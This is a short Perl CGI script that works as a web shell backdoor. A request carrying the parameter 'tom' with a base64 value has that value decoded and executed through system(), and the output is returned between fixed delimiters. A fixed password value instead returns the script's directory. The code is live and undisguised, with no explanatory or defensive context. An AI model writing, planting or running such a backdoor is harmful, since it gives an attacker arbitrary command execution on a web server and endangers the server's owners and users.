#!c:/Perl/bin/perl.exe

use MIME::Base64;  
use File::Basename;

my $dir = File::Basename::dirname($0);

print "Content-type: text/plain; charset=iso-8859-1\n\n";

if ($ENV{'REQUEST_METHOD'} eq "POST")
{read(STDIN, $buffer, $ENV{'CONTENT_LENGTH'});}
else {$buffer = $ENV{'QUERY_STRING'};}

@pairs = split(/&/, $buffer);
foreach $pair (@pairs) {
  ($name, $value) = split(/=/, $pair);

  $value =~ tr/+/ /;
  $value =~ s/%([a-fA-F0-9][a-fA-F0-9])/pack("C", hex($1))/eg;
  $value =~ s/<!--(.|\n)*-->//g;

  $value=~ s/\r\n/<br>/g;
  $FORM{$name} = $value if ($name);
} 

if ($name eq "tom") 
{

if ($value eq "Szh0ZWFt") 
{
   print "[S]".$dir."[E]";
}
else
{
  print "->|";
  system(decode_base64($value));
  print "|<-";
}

}